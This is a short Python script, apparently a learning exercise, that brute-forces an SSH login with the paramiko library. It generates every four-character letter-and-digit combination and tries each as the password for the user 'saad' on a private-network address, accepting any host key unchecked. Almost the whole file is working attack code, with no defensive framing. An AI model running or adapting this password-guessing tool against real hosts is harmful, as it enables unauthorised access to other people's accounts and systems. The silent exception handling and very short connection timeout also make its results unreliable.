import itertools as it
import string
import paramiko 

def create_client():
    client= paramiko.SSHClient()
    client_policy= paramiko.AutoAddPolicy()
    client.set_missing_host_key_policy(client_policy) 
    return client

class Brutes:
    def __init__(self, charset, length,ip):
        self.charset= charset 
        self.length= length 
        self.ip=ip
        
    def crackit(self,username): #password
        client= create_client()
        for guess in self.guesses:
            #print(guess)
            
            # if password==guess:
            #     print(guess)
            #     print('Found')
            #     return guess
            try:
                client.connect(self.ip, username=username, password=guess, timeout=0.01)
                return guess
            except:
                pass
            finally:
                client.close()
            
    @property
    def guesses(self):
        for guess in it.product(self.charset, repeat=self.length):
            yield ''.join(guess) 
            
def main():
    charset= string.ascii_letters+string.digits
    ip ='192.168.0.102'
    brute= Brutes(charset,4,ip)
    # for guess in brute.guesses:
    #     print(guess)
    password=brute.crackit(username='saad')
    if password:
        print('Found {}'.format(password))
    else:
        print(password)
if __name__=='__main__':
    main()
    
